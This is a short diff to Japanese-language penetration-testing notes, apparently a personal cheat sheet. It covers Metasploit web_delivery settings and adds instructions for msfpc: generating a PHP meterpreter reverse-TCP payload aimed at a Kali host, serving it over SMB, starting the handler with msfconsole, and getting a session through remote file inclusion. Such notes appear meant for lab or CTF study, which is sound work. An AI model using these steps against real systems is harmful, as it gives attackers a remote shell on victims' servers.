@@ -20,3 +20,9 @@ set target PSH #ターゲットを選ぶ。PHPやPythonなどがある。PSHは�
 set lhost <kali IP>
 set srvhost <kali IP>
 runするとペイロードが表示されるのでそれをPoC等コマンド実行できるもので送信する
+
+//msfpc
+metasploitで動かすペイロードとコマンドセットを自動で作成してくれる。RFIなどで活用できる
+msfpc php <kali IP>　＃これで作成されるphpをsmbディレクトリに置く
+msfconsole -q -r '/home/kali/Desktop/php-meterpreter-staged-reverse-tcp-443-php.rc'　＃runで表示されるこのコマンドを実行するとハンドラーで待ち受けまで自動でする
+RFIなどでphpを読み込ませたらmeterpreterでセッションが確立
